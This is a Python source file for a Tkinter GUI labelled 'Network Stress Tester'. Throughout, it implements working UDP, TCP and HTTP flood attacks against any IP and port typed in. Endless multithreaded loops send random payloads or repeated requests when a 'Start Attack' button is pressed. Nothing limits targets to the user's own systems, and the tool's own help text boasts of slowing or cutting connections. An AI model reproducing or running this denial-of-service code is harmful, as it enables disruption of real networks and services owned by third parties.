import socket
import threading
import random
import requests
import tkinter as tk
from tkinter import scrolledtext

print("github.com/laladaban33")


def udp_flood(target_ip, target_port, strength, console):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    
    def attack():
        while True:
            sock.sendto(payload, (target_ip, target_port))
            console.insert(tk.END, f"[UDP] Sent packet to {target_ip}:{target_port}\n")
            console.see(tk.END)
    
    for _ in range(strength):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()

def tcp_flood(target_ip, target_port, strength, console):
    def attack():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(random._urandom(1024))
                console.insert(tk.END, f"[TCP] Sent packet to {target_ip}:{target_port}\n")
                console.see(tk.END)
                sock.close()
            except:
                pass
    
    for _ in range(strength):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()

def http_flood(target_ip, strength, console):
    def attack():
        while True:
            try:
                response = requests.get(target_ip)
                console.insert(tk.END, f"[HTTP] Sent request to {target_ip}, Response: {response.status_code}\n")
                console.see(tk.END)
            except:
                pass
    
    for _ in range(strength):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()

def show_info():
    info_text = (
        "Strength Levels:\n"
        "Small: 10-50 - Slightly slows internet connection\n"
        "Medium: 100-500 - Can slow down or even shut off connection\n"
        "High: 1000+ - Might fry your router\n"
	"UDP Flood - Multiplies byte size/packet\n"
	"HTTP/TCP Flood - How many bots sending packets"
    )
    console.insert(tk.END, f"\n{info_text}\n")
    console.see(tk.END)

def start_attack():
    target_ip = ip_entry.get()
    target_port = int(port_entry.get())
    method = method_var.get()
    strength = int(strength_entry.get().split('-')[-1])
    
    console.insert(tk.END, f"Starting {method} attack on {target_ip}:{target_port} with strength {strength}\n")
    
    if method == "UDP":
        udp_flood(target_ip, target_port, strength, console)
    elif method == "TCP":
        tcp_flood(target_ip, target_port, strength, console)
    elif method == "HTTP":
        http_flood(target_ip, strength, console)

# GUI Setup
root = tk.Tk()
root.title("Network Stress Tester")
root.geometry("500x450")

tk.Label(root, text="Target IP:").pack()
ip_entry = tk.Entry(root)
ip_entry.pack()

tk.Label(root, text="Target Port:").pack()
port_entry = tk.Entry(root)
port_entry.pack()

tk.Label(root, text="Method:").pack()
method_var = tk.StringVar(value="UDP")
tk.OptionMenu(root, method_var, "UDP", "TCP", "HTTP").pack()

tk.Label(root, text="Strength (Threads/Rate):").pack()
strength_entry = tk.Entry(root)
strength_entry.pack()

# Info Button for Strength Levels
info_button = tk.Button(root, text="i Info", command=show_info)
info_button.pack()

tk.Button(root, text="Start Attack", command=start_attack).pack()

console = scrolledtext.ScrolledText(root, height=10)
console.pack()

root.mainloop()
